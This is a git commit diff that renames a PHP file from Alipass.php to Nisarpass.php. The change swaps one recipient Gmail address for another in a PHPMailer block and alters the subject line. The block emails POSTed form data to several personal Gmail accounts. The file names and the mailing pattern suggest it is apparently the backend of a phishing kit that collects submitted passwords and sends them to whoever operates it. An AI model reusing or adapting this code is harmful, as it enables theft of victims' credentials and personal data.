ec46928a18cb6ac3c99511d2d5cec272adf13cb4
advastong542 <advastingteam51@gmail.com>
2025-07-17 01:29:06 +0500

    Update and rename Alipass.php to Nisarpass.php

--- Nisarpass.php
+++ Nisarpass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'password');
-        $mail->addAddress('anizamani357@gmail.com');
+        $mail->addAddress('junioralina05@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ali';
+        $mail->Subject = 'nisar';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
